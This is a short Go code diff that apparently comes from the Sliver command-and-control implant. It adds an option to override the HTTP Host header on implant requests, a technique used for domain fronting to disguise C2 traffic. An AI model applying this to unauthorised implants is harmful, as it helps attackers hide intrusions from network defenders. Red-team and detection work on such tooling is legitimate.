@@ -70,6 +70,7 @@ type HTTPOptions struct {
 	ForceHTTP            bool
 	DisableAcceptHeader  bool
 	DisableUpgradeHeader bool
+	HostHeader           string
 
 	ProxyConfig   string
 	ProxyUsername string
@@ -109,6 +110,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
 		DisableAcceptHeader:  c2URI.Query().Get("disable-accept-header") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
+		HostHeader:           c2URI.Query().Get("host-header"),
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
@@ -221,6 +223,9 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
+	if s.Options.HostHeader != "" {
+		req.Host = s.Options.HostHeader
+	}
 	req.Header.Set("User-Agent", userAgent)
 	if method == http.MethodGet && !s.Options.DisableAcceptHeader {
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
